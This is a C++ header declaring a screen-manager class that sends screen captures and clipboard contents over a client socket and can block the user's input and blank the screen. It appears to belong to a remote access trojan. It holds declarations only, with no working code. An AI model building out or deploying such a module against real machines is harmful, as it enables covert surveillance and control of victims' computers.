#ifndef __TSP_SCREENMANAGER_H__
#define __TSP_SCREENMANAGER_H__

#include "Manager.h"
#include "ScreenSpy.h"

class CScreenManager : public CManager  
{
public:
	CScreenManager(CClientSocket *pClient);
	virtual ~CScreenManager();

public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendFirstScreen();
	int sendNextScreen();
	BOOL IsMetricsChange();
	BOOL IsConnect();
	int	GetCurrentPixelBits();

private:
	void ResetScreen(int biBitCount);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI	ControlThread(LPVOID lparam);
	void UpdateLocalClipboard(char *buf, int len);
	void SendLocalClipboard();

private:
	BOOL m_bIsWorking;
	BOOL m_bIsBlockInput;
	BOOL m_bIsBlankScreen;


	BYTE m_bAlgorithm;
	BOOL m_bIsCaptureLayer;
	int	m_biBitCount;
	HANDLE m_hWorkThread;
	HANDLE m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy	*m_pScreenSpy;
};

#endif //__TSP_SCREENMANAGER_H__
